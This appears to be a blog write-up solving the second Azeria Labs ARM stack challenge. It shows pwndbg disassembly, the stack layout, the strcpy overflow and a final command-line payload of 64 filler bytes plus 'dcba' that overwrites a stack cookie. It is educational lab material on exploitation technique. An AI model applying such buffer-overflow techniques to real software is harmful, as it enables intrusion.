@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Smashing ARM Stack for Fun - Part II</title>
+  <meta name="description" content="This is going to be a fast moving post, directly to the details,about exploiting the second Arm challenge">
+
+  
+    <link href='//fonts.googleapis.com/css?family=Lato:400,400italic' rel='stylesheet' type='text/css'>
+  
+
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        extensions: ["tex2jax.js"],
+        jax: ["input/TeX","output/HTML-CSS"],
+        tex2jax: {inlineMath: [["$$","$$"],["\\(","\\)"]]},
+	TeX: {
+	  Macros: {
+            
+	  }
+	}
+      });
+    </script>
+    
+      <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js' async></script>
+    
+  
+
+  
+    <script
+       src="https://code.jquery.com/jquery-3.4.1.min.js"
+       integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
+       crossorigin="anonymous"></script>
+  
+
+  
+
+    
+      <script src='https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.9.1/underscore-min.js' ></script>
+    
+
+    
+      <script src="https://d3js.org/d3.v4.min.js"></script>
+    
+
+    <script src='/book-of-gehn/js/venn/venn.min.js'></script>
+    <script src='/book-of-gehn/js/venn/helper.js'></script>
+
+    <script src='/book-of-gehn/js/fix_syntax_highlight.js'></script>
+  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/tufte.css">
+  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/latex.css">
+
+  <link rel="canonical" href="/book-of-gehn/articles/2021/01/17/Smashing-ARM-Stack-for-Fun-Part-II.html">
+
+  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/all.min.css">
+
+  <link type="application/atom+xml" rel="alternate" href="/book-of-gehn/feed.xml" title="The Book of Gehn" />
+</head>
+
+  <body>
+    <header>
+	
+		<h1 class="header-title"><a href="/book-of-gehn/">The Book of Gehn</a></h1>
+		
+		
+	
+
+    
+
+    
+</header>
+
+    <article class="group">
+      <h1>Smashing ARM Stack for Fun - Part II</h1>
+<p class="subtitle">January 17, 2021</p>
+
+<p>This is going to be a fast moving post, directly to the details,
+about exploiting the <a href="https://github.com/azeria-labs/ARM-challenges">second Arm challenge</a><!--more--></p>
+
+<h2 id="распределение-стека">Распределение стека</h2>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="err">►</span> <span class="mh">0x104b0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;</span>       <span class="k">push</span>   <span class="err">{</span><span class="n">fp</span><span class="p">,</span> <span class="n">lr</span><span class="err">}</span>
+   <span class="mh">0x104b4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span>     <span class="k">add</span>    <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span>
+   <span class="mh">0x104b8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span>     <span class="k">sub</span>    <span class="n">sp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x50</span>
+   <span class="mh">0x104bc</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x50</span><span class="err">]</span>
+   <span class="mh">0x104c0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r1</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x54</span><span class="err">]</span>
+</code></pre></div></div>
+
+<p>0x58 bytes are allocated where 0x54 bytes belong to the current stack
+frame.</p>
+
+<p>The first two words are allocated by <code class="highlighter-rouge">push</code> and the rest by <code class="highlighter-rouge">sub</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">100</span><span class="p">:</span><span class="mi">00</span><span class="o">&gt;</span> <span class="p">;</span><span class="err">!</span> <span class="n">M</span><span class="p">[</span><span class="n">sp</span><span class="p">:]</span>   <span class="c1"># &lt;-- from sp to the end of the mapped page
+</span><span class="p">[</span>
+        <span class="o">--</span>
+        <span class="o">|</span>   \<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>   <span class="o">==</span> <span class="n">r1</span>
+        <span class="o">|</span>   \<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>   <span class="o">==</span> <span class="n">r0</span>
+  <span class="mh">0x50</span>  <span class="o">|</span>   \<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>
+        <span class="o">|</span>   <span class="o">...</span> <span class="mi">16</span> <span class="n">more</span> <span class="n">rows</span> <span class="n">full</span> <span class="n">of</span> <span class="n">zeros</span> <span class="o">...</span>
+<span class="n">cookie</span> <span class="o">-|--&gt;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>
+        <span class="o">--</span>
+   <span class="mh">0x8</span>  <span class="o">|</span>   \<span class="n">xbb</span>\<span class="n">xbb</span>\<span class="n">xbb</span>\<span class="n">xbb</span>   <span class="o">==</span> <span class="n">fp</span>
+ <span class="n">fp</span> <span class="o">----|--&gt;</span>\<span class="n">xaa</span>\<span class="n">xaa</span>\<span class="n">xaa</span>\<span class="n">xaa</span>   <span class="o">==</span> <span class="n">lr</span>
+        <span class="o">--</span>
+<span class="p">]</span> <span class="o">&lt;--</span> <span class="n">base</span> <span class="n">of</span> <span class="n">stack</span>
+</code></pre></div></div>
+
+<h2 id="проверка-аргументов">Проверка аргументов</h2>
+
+<p><label for="mn-5f1b73cfdf736e197a64538d2da896f0" class="margin-toggle"> ⊕</label><input type="checkbox" id="mn-5f1b73cfdf736e197a64538d2da896f0" class="margin-toggle" /><span class="marginnote"><code class="highlighter-rouge">errx</code> prints a message to the standard error output and then makes
+the program exit.
+<br />
+See <a href="https://linux.die.net/man/3/errx">man errx</a>
+ </span></p>
+
+<p><code class="highlighter-rouge">argc</code> is expected to be 1 otherwise the program will <strong>not</strong> jump
+and <code class="highlighter-rouge">errx</code> will be called.</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x104c4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x50</span><span class="err">]</span>
+   <span class="mh">0x104c8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span>    <span class="k">cmp</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">1</span>
+   <span class="mh">0x104cc</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;</span>    <span class="n">bne</span>    <span class="err">#</span><span class="n">main</span><span class="o">+</span><span class="mi">44</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;</span>
+
+   <span class="mh">0x104d0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">#</span><span class="mi">1</span>
+   <span class="mh">0x104d4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r1</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x5c</span><span class="err">]</span>
+   <span class="mh">0x104d8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;</span>    <span class="n">bl</span>     <span class="err">#</span><span class="n">errx</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">errx</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+
+ <span class="err">►</span> <span class="mh">0x104dc</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
+</code></pre></div></div>
+
+<p><label for="mn-795a8969e99a4639da80888a1ab5197e" class="margin-toggle"> ⊕</label><input type="checkbox" id="mn-795a8969e99a4639da80888a1ab5197e" class="margin-toggle" /><span class="marginnote">As mentioned in a <a href="/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html">previous post</a>,
+when <code class="highlighter-rouge">pc</code> is used for indexing
+the <code class="highlighter-rouge">pc</code> is the address of the current about-to-be-executed instruction
+<em>plus</em> 8 bytes.
+ </span></p>
+
+<p>Let’s see  <code class="highlighter-rouge">ldr r1, [pc, #0x5c]</code> which translates to 0x104d4 + 0x5c + 0x8:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">wx</span> <span class="mh">0x10538</span>
+<span class="mh">0x10538</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">136</span><span class="o">&gt;:</span>     <span class="mh">0x000105bc</span>
+
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">bs</span> <span class="mh">0x000105bc</span>
+<span class="mh">0x105bc</span><span class="o">:</span>        <span class="s">"please specify an argument</span><span class="se">\n</span><span class="s">"</span>
+</code></pre></div></div>
+
+<h2 id="переполнение-буфера">Переполнение буфера</h2>
+
+<p>A cookie is stored in the stack with a value of zero. Then <code class="highlighter-rouge">argv</code>
+is loaded into <code class="highlighter-rouge">r3</code> or <code class="highlighter-rouge">&amp;argv[0]</code> if you want.</p>
+
+<p>The <code class="highlighter-rouge">add</code> instruction moves <code class="highlighter-rouge">argv</code> pointer 4 bytes forward. In other
+words, <code class="highlighter-rouge">r3</code> <em>points</em> to <code class="highlighter-rouge">argv[1]</code>.</p>
+
+<p>Finally the pointer is dereferenced and <code class="highlighter-rouge">r3</code> <em>has</em> the <code class="highlighter-rouge">argv[1]</code>
+pointer.</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="err">►</span> <span class="mh">0x104dc</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
+   <span class="mh">0x104e0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
+   <span class="mh">0x104e4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">52</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x54</span><span class="err">]</span>
+   <span class="mh">0x104e8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">56</span><span class="o">&gt;</span>    <span class="k">add</span>    <span class="n">r3</span><span class="p">,</span> <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span>
+   <span class="mh">0x104ec</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">60</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r3</span><span class="p">,</span> <span class="p">[r3]</span>
+</code></pre></div></div>
+
+<p>Like in the <a href="/book-of-gehn/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html">previous challenge</a>,
+begin of the buffer for <code class="highlighter-rouge">strcpy</code>
+is 4 bytes below the pushed arguments and has a size of 64 bytes
+(0x48 bytes minus 4 bytes for the pushed <code class="highlighter-rouge">fp</code> and 4 bytes for the
+cookie)</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x104f0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;</span>    <span class="k">sub</span>    <span class="n">r2</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x48</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">100</span><span class="p">:</span><span class="mi">20</span><span class="o">&gt;</span> <span class="p">;</span><span class="err">!</span> <span class="n">M</span><span class="p">[</span><span class="n">sp</span><span class="p">:]</span>
+<span class="p">[</span>
+        <span class="o">--</span>
+        <span class="o">|</span>   \<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>   <span class="o">==</span> <span class="n">r1</span>
+        <span class="o">|</span>   \<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>   <span class="o">==</span> <span class="n">r0</span>
+  <span class="mh">0x50</span>  <span class="o">|</span>   \<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>
+<span class="n">buf</span> <span class="o">----|--&gt;</span><span class="n">AAAA</span>
+        <span class="o">|</span>   <span class="n">BBBB</span>
+        <span class="o">|</span>   <span class="n">CCCC</span>
+        <span class="o">|</span>   <span class="o">...</span> <span class="mi">13</span> <span class="n">more</span> <span class="n">rows</span> <span class="n">full</span> <span class="n">of</span> <span class="n">zeros</span> <span class="o">...</span>
+<span class="n">cookie</span> <span class="o">-|--&gt;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>
+        <span class="o">--</span>
+   <span class="mh">0x8</span>  <span class="o">|</span>   \<span class="n">xbb</span>\<span class="n">xbb</span>\<span class="n">xbb</span>\<span class="n">xbb</span>   <span class="o">==</span> <span class="n">fp</span>
+ <span class="n">fp</span> <span class="o">----|--&gt;</span>\<span class="n">xaa</span>\<span class="n">xaa</span>\<span class="n">xaa</span>\<span class="n">xaa</span>   <span class="o">==</span> <span class="n">lr</span>
+        <span class="o">--</span>
+<span class="p">]</span>
+</code></pre></div></div>
+
+<p>Finally the call to <code class="highlighter-rouge">strcpy</code> is made:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x104f4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r0</span><span class="p">,</span> <span class="n">r2</span>
+   <span class="mh">0x104f8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">72</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r1</span><span class="p">,</span> <span class="n">r3</span>
+   <span class="mh">0x104fc</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;</span>    <span class="n">bl</span>     <span class="err">#</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<h2 id="сравнение">Сравнение</h2>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="err">►</span> <span class="mh">0x10500</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">80</span><span class="o">&gt;</span>     <span class="n">ldr</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
+   <span class="mh">0x10504</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;</span>     <span class="n">ldr</span>    <span class="n">r2</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x30</span><span class="err">]</span>
+   <span class="mh">0x10508</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">88</span><span class="o">&gt;</span>     <span class="k">cmp</span>    <span class="n">r3</span><span class="p">,</span> <span class="n">r2</span>
+   <span class="mh">0x1050c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;</span>     <span class="n">bne</span>    <span class="err">#</span><span class="n">main</span><span class="o">+</span><span class="mi">108</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">108</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>The cookie is loaded from the stack and compared with the value
+stored in the code segment at 0x10504 + 0x30 + 0x8:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">wx</span> <span class="mh">0x1053c</span>
+<span class="mh">0x1053c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">140</span><span class="o">&gt;:</span>     <span class="mh">0x61626364</span>
+</code></pre></div></div>
+
+<p>The good old <code class="highlighter-rouge">'abcd'</code> or <code class="highlighter-rouge">'dcba'</code> to be more precise due the endianess
+of the machine.</p>
+
+<p>A byte by byte inspection may make this more explicit:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">bx</span> <span class="mh">0x1053c</span>
+<span class="mh">0x1053c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">140</span><span class="o">&gt;:</span>     <span class="mh">0x64</span>    <span class="mh">0x63</span>    <span class="mh">0x62</span>    <span class="mh">0x61</span>
+</code></pre></div></div>
+
+<h2 id="наша-цель-branch-at-0x1050c-not-taken">Наша цель (branch at 0x1050c <strong>not</strong> taken):</h2>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">pdisass</span> <span class="mh">0x10510</span>
+ <span class="err">►</span> <span class="mh">0x10510</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;</span>     <span class="n">ldr</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x28</span><span class="err">]</span>
+   <span class="mh">0x10514</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">100</span><span class="o">&gt;</span>    <span class="n">bl</span>     <span class="err">#</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+
+   <span class="mh">0x10518</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">104</span><span class="o">&gt;</span>    <span class="n">b</span>      <span class="err">#</span><span class="n">main</span><span class="o">+</span><span class="mi">124</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">124</span><span class="o">&gt;</span>
+
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">wx</span> <span class="mh">0x10540</span>
+<span class="mh">0x10540</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">144</span><span class="o">&gt;:</span>     <span class="mh">0x000105d8</span>
+
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">bs</span> <span class="mh">0x000105d8</span>
+<span class="mh">0x105d8</span><span class="o">:</span>        <span class="s">"you have correctly got the variable to the right value"</span>
+</code></pre></div></div>
+
+<h2 id="неудача-branch-at-0x1050c-is-taken">Неудача (branch at 0x1050c <strong>is</strong> taken):</h2>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">pdisass</span> <span class="o">&amp;</span><span class="n">main</span><span class="o">+</span><span class="mi">108</span> <span class="mi">10</span>
+ <span class="err">►</span> <span class="mh">0x1051c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">108</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
+   <span class="mh">0x10520</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">112</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x1c</span><span class="err">]</span>
+   <span class="mh">0x10524</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">116</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r1</span><span class="p">,</span> <span class="n">r3</span>
+   <span class="mh">0x10528</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">120</span><span class="o">&gt;</span>    <span class="n">bl</span>     <span class="err">#</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">wx</span> <span class="mh">0x10544</span>
+<span class="mh">0x10544</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">148</span><span class="o">&gt;:</span>     <span class="mh">0x00010610</span>
+
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">bs</span> <span class="mh">0x00010610</span>
+<span class="mh">0x10610</span><span class="o">:</span>        <span class="s">"Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">"</span>
+</code></pre></div></div>
+
+<h2 id="эпилог">Эпилог</h2>
+
+<p>We reach here regardless of which path the branch at 0x1050c jumped to:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">pdisass</span> <span class="o">&amp;</span><span class="n">main</span><span class="o">+</span><span class="mi">124</span>
+ <span class="err">►</span> <span class="mh">0x1052c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">124</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r0</span><span class="p">,</span> <span class="n">r3</span>
+   <span class="mh">0x10530</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">128</span><span class="o">&gt;</span>    <span class="k">sub</span>    <span class="n">sp</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span>
+   <span class="mh">0x10534</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">132</span><span class="o">&gt;</span>    <span class="k">pop</span>    <span class="err">{</span><span class="n">fp</span><span class="p">,</span> <span class="n">pc</span><span class="err">}</span>
+</code></pre></div></div>
+
+<h2 id="атака">Атака</h2>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~<span class="nv">$ </span>./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
+you have correctly got the variable to the right value
+</code></pre></div></div>
+
+
+
+    </article>
+    <span class="print-footer">Smashing ARM Stack for Fun - Part II - January 17, 2021 - Gehn</span>
+    <footer>
+    <hr class="slender">
+    <div class="credits">
+        <span>&copy; 2021
+            
+            Gehn
+        </span></br>
+            <a style="text-decoration: none;" href="/book-of-gehn/feed.xml"><img height="16px" width="16px" src="/book-of-gehn/assets/blog-assets/rss-32px.png" /></a>
+        <br>
+        
+
+    
+    </div>
+</footer>
+
+  </body>
+</html>
